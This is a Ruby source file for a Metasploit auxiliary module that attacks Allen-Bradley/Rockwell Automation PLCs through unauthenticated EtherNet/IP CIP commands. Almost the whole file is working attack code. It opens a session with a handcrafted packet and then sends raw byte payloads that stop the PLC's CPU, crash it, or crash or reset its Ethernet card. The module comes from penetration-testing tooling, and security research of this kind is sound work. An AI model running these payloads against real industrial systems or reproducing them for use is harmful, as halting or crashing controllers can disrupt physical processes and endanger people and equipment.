##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Rex::Socket::Tcp

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'Allen-Bradley/Rockwell Automation EtherNet/IP CIP Commands',
			'Description'    => %q{
				The EtnerNet/IP CIP protocol allows a number of unauthenticated commands to a PLC which
				implements the protocol.  This module implements the CPU STOP command, as well as
				the ability to crash the Ethernet card in an affected device.

				This module is based on the original 'ethernetip-multi.rb' Basecamp module
				from DigitalBond.
			},
			'Author'         =>
				[
					'Ruben Santamarta <ruben[at]reversemode.com>',
					'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
					'todb' # Metasploit fixups
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
				],
			'DisclosureDate' => 'Jan 19 2012'))

		register_options(
			[
				Opt::RPORT(44818),
				# Note that OptEnum is case sensitive
				OptEnum.new("ATTACK", [true, "The attack to use.", "STOPCPU",
					[
						"STOPCPU",
						"CRASHCPU",
						"CRASHETHER",
						"RESETETHER"
					]
				])
			], self.class
		)
	end

	def run
		attack = datastore["ATTACK"]
		print_status "#{rhost}:#{rport} - CIP - Running #{attack} attack."
		sid = req_session
		if sid
			forge_packet(sid, payload(attack))
			print_status "#{rhost}:#{rport} - CIP - #{attack} attack complete."
		end
	end

	def forge_packet(sessionid, payload)
		packet = ""
		packet += "\x6f\x00" # command: Send request/reply data
		packet += [payload.size - 0x10].pack("v") # encap length (2 bytes)
		packet += [sessionid].pack("N") # session identifier (4 bytes)
		packet += payload #payload part
		begin
			sock.put(packet)
		rescue ::Interrupt
			print_error("#{rhost}:#{rport} - CIP - Interrupt during payload")
			raise $!
		rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused
			print_error("#{rhost}:#{rport} - CIP - Network error during payload")
			return nil
		end
	end

	def req_session
		begin
			connect
			packet = ""
			packet += "\x65\x00" # ENCAP_CMD_REGISTERSESSION (2 bytes)
			packet += "\x04\x00" # encaph_length (2 bytes)
			packet += "\x00\x00\x00\x00" # session identifier (4 bytes)
			packet += "\x00\x00\x00\x00" # status code (4 bytes)
			packet += "\x00\x00\x00\x00\x00\x00\x00\x00" # context information (8 bytes)
			packet += "\x00\x00\x00\x00" # options flags (4 bytes)
			packet += "\x01\x00" # proto (2 bytes)
			packet += "\x00\x00" # flags (2 bytes)
			sock.put(packet)
			response = sock.get_once
			if response
				session_id = response[4..8].unpack("N")[0] rescue nil# bare minimum of parsing done
				if session_id
					print_status("#{rhost}:#{rport} - CIP - Got session id: 0x"+session_id.to_s(16))
				else
					print_error("#{rhost}:#{rport} - CIP - Got invalid session id, aborting.")
					return nil
				end
			else
				raise ::Rex::ConnectionTimeout
			end
		rescue ::Interrupt
			print_error("#{rhost}:#{rport} - CIP - Interrupt during session negotation")
			raise $!
		rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused => e
			print_error("#{rhost}:#{rport} - CIP - Network error during session negotiation: #{e}")
			return nil
		end
		return session_id
	end

	def cleanup
		disconnect rescue nil
	end

	def payload(attack)
		case attack
		when "STOPCPU"
			payload =  "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + #encapsulation -[payload.size-0x10]-
			"\x00\x00\x00\x00\x02\x00\x02\x00\x00\x00\x00\x00\xb2\x00\x1a\x00" + #packet1
			"\x52\x02\x20\x06\x24\x01\x03\xf0\x0c\x00\x07\x02\x20\x64\x24\x01" + #packet2
			"\xDE\xAD\xBE\xEF\xCA\xFE\x01\x00\x01\x00"                           #packet3
		when "CRASHCPU"
			payload = "\x00\x00\x00\x00\x02\x00\x02\x00\x00\x00\x00\x00\xb2\x00\x1a\x00" +
			"\x52\x02\x20\x06\x24\x01\x03\xf0\x0c\x00\x0a\x02\x20\x02\x24\x01" +
			"\xf4\xf0\x09\x09\x88\x04\x01\x00\x01\x00"
		when "CRASHETHER"
			payload = "\x00\x00\x00\x00\x20\x00\x02\x00\x00\x00\x00\x00\xb2\x00\x0c\x00" +
			"\x0e\x03\x20\xf5\x24\x01\x10\x43\x24\x01\x10\x43"
		when "RESETETHER"
			payload = "\x00\x00\x00\x00\x00\x04\x02\x00\x00\x00\x00\x00\xb2\x00\x08\x00" +
			"\x05\x03\x20\x01\x24\x01\x30\x03"
		else
			print_error("#{rhost}:#{rport} - CIP - Invalid attack option.")
			return nil
		end
	end

end
